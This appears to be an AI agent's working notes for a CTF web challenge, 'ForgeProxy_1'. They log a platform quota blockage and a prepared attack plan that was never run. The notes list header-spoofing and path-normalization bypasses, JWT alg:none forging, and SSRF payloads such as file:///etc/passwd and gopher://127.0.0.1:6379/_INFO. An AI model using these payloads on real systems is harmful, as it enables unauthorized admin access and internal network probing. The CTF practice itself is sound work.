# 12066 · ForgeProxy_1（WEB / HARD / 500）

> 2026 羊城杯（DASCTF，match 1750）· 赛中新放题 · 平台：`ycb-bk.dasctf.com`（stage 3241）
> 本文件记录：题面一手字段、**平台侧行为（含缺陷）**、以及"拿到地址后的完整发射矩阵"。
> 最后更新：见文末时间戳。

---

## 1. 题面（一手，`work/ch_12066/detail.json`，2026-10-24 12:19 取；12:33 复核）

> 某工业园区部署了一套边缘计算网关管理平台，负责处理设备间的通信代理和流量调度。近期运维团队在日志中发现异常请求记录，怀疑系统存在安全隐患。作为安全审计人员，请对该平台进行全面的安全评估，尝试获取系统中的敏感信息。

| 字段 | 值 | 备注 |
|---|---|---|
| id / name | `12066` / `ForgeProxy_1` | `_1` 后缀 ⇒ 可能还有 `ForgeProxy_2` |
| difficulty / score | `HARD` / `500`（初始=当前=500） | 12:33 时 **0 队解出** |
| endpointType | `monopoly` | 与 12062/12064/12067/12070/12078 同型（动态题） |
| isNeedInit | 12:19 时 `true`；12:33 复核为 **`false`** | 字段中途变过（平台侧写入） |
| attachment | 只有 `此题无附件.txt` | **纯黑盒，无源码/无二进制** |
| canRefreshEndpoint | `false` | 不能自助刷新地址 |
| endpoints | `[]`（12:19 → 12:33 始终为空） | 见 §2 |

**对照证据（同场可用实例的字段形状）**——`work/ch_12064/detail.json`：

```json
{"objectId":"endpoint_eab4f54139ed472e873f21b1cfc2d872",
 "exposeIps":["<target>:22179"], "serviceStatus":"UP", "status":"running",
 "ports":["nc/8000"], "portMappings":[{"type":"nc","port":"8000","proxy":"22179"}],
 "proxyIps":["<target>"], "isProxy":true, "expireTime":1792830600000}
```
⇒ 本届 web/pwn 靶机全在 **`<target>`**，每题一个 `proxy` 端口；地址 = `proxyIps[0] + ":" + portMappings[0].proxy`。

---

## 2. 平台侧行为记录（一手实测）——**本题真正的阻塞：全队靶机名额满**

### 2.1 时间线

| 时刻（本机 `date`） | 动作 | 平台原文 |
|---|---|---|
| 12:22（父代理） | `env start 12066` | 返回成功（占 1 个槽位） |
| 12:26 | `build 12066`（我） | `{"code":"40409","message":"已构建，请勿频繁点击"}` |
| 12:26–12:49 | `check-exercise-env` / `detail` ×40+ | `data:false` 恒定；`endpoints: []` 恒定 |
| 12:49:58 | `recover-exercise-env` 12066（销毁） | **`{"code":"00000","message":"销毁靶机成功"}`** |
| 12:51:23 | `build 12066` | `40409 已构建，请勿频繁点击` |
| **12:53:24** | `build 12066` | **`40409 「本场比赛创建靶机台数已达4数量，请销毁一台已创实例」`** ← 语义变了 |
| 12:55:25 | `build 12066` | 同上（已达4数量） |
| 12:57:25 | 再销毁 12066 → 20s 后 build | 销毁成功，但 build 仍 **`已达4数量`** ⇒ **销毁不立即回落计数** |

### 2.2 ★★ 两个 `40409` 是**不同语义**（本场最可复用的判据）

| 回包 message | 含义 | 处置 |
|---|---|---|
| `已构建，请勿频繁点击` | **该 exercise 自身**处于构建/销毁后的短时冷却 | 等 60s+，别连发 |
| `本场比赛创建靶机台数已达4数量，请销毁一台已创实例` | **全队 4 个名额满**，与本题无关 | 只能腾名额；且实测**销毁后不立即回落**，本轮无法靠"销毁别人"救急 |

⇒ 我最初把它当"幽灵容器"，更准确的说法是：**占着名额、但没有活实例的记录**。
判定式：`detail.endpoints == []` 且 `build` 回 `已达4数量` ⇒ 名额被占（不是题的问题）；
若 `build` 回 `已构建` ⇒ 只是本条记录限流。`check-exercise-env` 的 `data:false` **完全无判别力**（12064 正常在用、12065 现在活着，回包也照样 `data:false`/不带 endpoint）。

### 2.3 12:56 全题 `detail.endpoints` 扫描（16 题，一手）

| 题 | `detail.endpoints` | 端口实测（`curl -m5`） |
|---|---|---|
| 12065 ApprovalFlow | `running / UP / <target>:16122` | **HTTP 200（活）** |
| 12064 DataPulse | `[]` | `<target>:22179` **connection refused（已死）** |
| 12061 pdfchallenge | `[]` | 地址从未产出 |
| 12066 ForgeProxy_1（本题） | `[]` | 无 |
| 12062/12063/12067/12069/12070/12072/12073/12074/12075/12076/12077/12078/12086 | `[]` | 未测（非本题） |

（`12069` 的活实例 `:22088` 由父代理/其代理报出，是 4 条记录之一。）
⇒ 4 条占额记录 = 12065（活）+ 12064（容器已死仍占记录）+ 12069（活）+ 12066（本题，构建被名额挡回）。
**父代理 12:57 决策：12066 让位给 12069（后者已把利用链收敛到只差一个跳转目标），本轮不销毁任何他人记录。**

## 3. 题型假设（black box，按"网关代理"语义排序）

题名 `ForgeProxy` + "设备通信代理 / 流量调度" ⇒ **反向代理 / 边缘网关**。三条主线，按期望收益排序：

| # | 假设 | 判据（怎么算成立） |
|---|---|---|
| H1 | **头伪造绕过 admin 鉴权**：网关按 `X-Forwarded-For`/`X-Real-IP`/`Forwarded`/`X-Original-URL` 判定"内网/本机"身份 | 未认证请求加头后，响应从 `401/403` 变成 `200` 或出现 admin 页面/新路由 |
| H2 | **路径归一化差异**：网关路由匹配用未归一化路径，后端用归一化路径（或反之）⇒ 访问被网关屏蔽的内部路由 | `/admin` 403 但 `/./admin` `/api/../admin` `/%2e%2e/admin` `/admin;.js` `/admin%2f` 之一不是 403/404 |
| H3 | **token/签名 forge**：JWT（`alg:none`、空签名、弱密钥）或"网关签名头"可预测 | 能构造出被接受的 admin JWT / 签名 |
| H4 | **SSRF 后继**：出现 `url=`/`target=`/`proxy=`/`host=` 参数 ⇒ 内部面（127.0.0.1 变体） | 服务端取回内网内容 |

内网横向（H4 成立后）：扫**容器内部** 80/3000/5000/8000/8080/8081/9000/6379/5432，找"没有网关保护"的后端。

---

## 4. 发射矩阵（已写好，环境 ready 后一条命令跑完）

工具：`work/12066_forge/fire.py`（单 `requests.Session` **keep-alive**，串行、200ms 间隔——平台容器是"累计新连接数耗尽"型，**绝不可并发**；每条落 `evidence/NNN-<tag>.txt`，curl -i 风格含请求头/响应头/sha256）。

```bash
cd ~/ctf-2026
BASE=$(cat work/12066_forge/base.txt) python3 work/12066_forge/fire.py fp     # 指纹+拉全部JS+抽路由
python3 work/12066_forge/fire.py js                                          # 重抽路由 → routes.txt
python3 work/12066_forge/fire.py probe routes.txt                            # 探测 JS 里得到的路由（≤30）
python3 work/12066_forge/fire.py fires / /admin /api/ /dashboard              # 头伪造矩阵 12 头 × N 路径
python3 work/12066_forge/fire.py norm                                        # 路径归一化矩阵 22 条
python3 work/12066_forge/fire.py crawl                                       # 站内广度爬 ≤60
python3 work/12066_forge/fire.py req GET '/x' 'X-Forwarded-For: 127.0.0.1'   # 临时单发
python3 work/12066_forge/fire.py ssrf '/api/proxy?url=' url                  # SSRF 变体 11 条
```

`fire.py fp` 覆盖：`/`、`OPTIONS /`、`/robots.txt`、`/favicon.ico`（含 sha256，可对指纹库）、`/nope-404-probe`、
`<script src>` 全量下载到 `evidence/js-*`、`/static/ /assets/ /js/ /_next/static/` 目录探一格。
路由抽取正则覆盖 `api|admin|internal|dashboard|proxy|gateway|manage|console|ops|debug|health|metrics|status|user|auth|login|flag|secret` 前缀 ⇒ `routes.txt`。

**自测（已做，离线）**：本地起一个含 `<script src>` + 内联 `window.__ROUTES__` 的 mock 网关，
`BASE=http://127.0.0.1:8099 python3 fire.py fp` 端到端跑通 —— 正确下载 JS/CSS、抽出 **10 条候选路由**
（含 `/api/v1/auth/login`、`/internal/api/admin/users`、`/api/v1/flag`），逐条落盘 `evidence/NNN-*.txt`（含响应 sha256）；
`jwtkit.py decode/forge`（`alg:none`/空签名/HS256 都生成了可解码 token）与 `ssrfscan.py` 亦通过语法+首行行为检查。
⇒ 实靶一到命令即可直接跑，**不存在"脚本没调通"的二次成本**。

**头伪造清单（`fires` 内置）**：`X-Forwarded-For: 127.0.0.1`、`X-Real-IP`、`X-Client-IP`、`X-Originating-IP`、
`X-Original-URL: /admin`、`X-Rewrite-URL: /admin`、`X-Forwarded-Host`、`X-Forwarded-Proto`、
`Forwarded: for=127.0.0.1;proto=http;host=127.0.0.1`、`Via: 1.1 forgeproxy-internal`、
`X-Internal-Request: 1`、`X-Admin: true`。

**路径归一化清单（`norm` 内置）**：`/admin` `/./admin` `//admin` `/admin/` `/ADMIN` `/admin/.`
`/api/../admin` `/%2e%2e/admin` `/admin;.js` `/admin.json` `/admin%2f` `/admin%00` `/%2fadmin`
`/..;/admin` `/admin/..;/` `/./api/v1/../admin` `/admin?` `/admin#` `/./admin/` `/api/v1/admin` `/internal` `/internal/admin`。

**SSRF 变体（`ssrf` 内置）**：`127.0.0.1:80|3000`、`127.1`、`2130706433`、`0x7f000001`、`0`、`[::1]`、`localhost`、
`file:///etc/passwd`、`gopher://127.0.0.1:6379/_INFO`（后两串在本平台历史上多次被证明可用于内部面探测）。

---

## 5. 状态与执行顺序（地址一 ready 直接照做）

**状态（12:58 定稿）**：容器从未 ready（`endpoints: []`）⇒ **一条实靶请求都没发出去**，
§3 的 H1–H4 **全部未验证**（是"没机会测"，不是"已排除"）。`FLAG: NONE`，`SUBMIT: NOT_ATTEMPTED`（不猜写法）。
阻塞归类：**平台侧名额耗尽（4/4，且销毁不立即回落）**，非题目缺陷、非操作错误。

**一拿到地址就按这个顺序跑**（单线程、200ms 间隔、每 30 条自动健康检查；平台容器是"累计新连接耗尽"型，禁并发）：

```bash
cd ~/ctf-2026
# 0) 取址：watch_env.py 会自动把地址写进 work/12066_forge/base.txt
BASE=$(cat work/12066_forge/base.txt) python3 work/12066_forge/fire.py fp
#    → / OPTIONS /robots.txt /favicon.ico(sha256) /404 + 全量 <script src> 落 evidence/js-* + 目录探一格
#    → routes.txt（正则已覆盖 api|admin|internal|dashboard|proxy|gateway|manage|console|ops|debug|health|metrics|status|user|auth|login|flag|secret）

# 1) 只打 JS 里得到的路由（≤30 条，不要大字典）
python3 work/12066_forge/fire.py probe routes.txt

# 2) 三组矩阵，**自动打印与 baseline 的 diff，只盯 DIFF 行**
python3 work/12066_forge/fire.py fires / /admin /api/ /api/v1/ /dashboard   # 12 种伪造头
python3 work/12066_forge/fire.py norm                                       # 22 条路径归一化

# 3) 站内广度爬（≤60），顺手收集登录/上传/代理类功能
python3 work/12066_forge/fire.py crawl

# 4) 拿到任何 token → jwtkit 批量 forge，再逐条回放
python3 work/12066_forge/jwtkit.py decode '<token>'
python3 work/12066_forge/jwtkit.py forge '<token>' --claims '{"role":"admin","sub":"admin"}' > work/12066_forge/toks.txt
while read t; do python3 work/12066_forge/fire.py req GET '/api/me' "Authorization: Bearer $t"; done < work/12066_forge/toks.txt

# 5) 一旦发现 url=/target=/proxy=/host= 参数 → 内部面测绘（只经靶机自身 SSRF 发起）
python3 work/12066_forge/ssrfscan.py '/<ssrf路径>?<参数>=' --quick
```

判据汇总：H1 成立 = 未认证请求加头后状态码/长度偏离 baseline；H2 成立 = 归一化变体与 `/admin` baseline 不同；
H3 成立 = forge 出的 token 被接受（返回 200 或有身份信息）；H4 成立 = `ssrfscan` 出 HIT（响应非"连接失败/超时"）。

_时间戳：2026-10-24 12:58 CST（本机 `date` 校准。父代理口头时间曾早标 58 分钟——**遇到"时间不够"先自己 `date`**）_
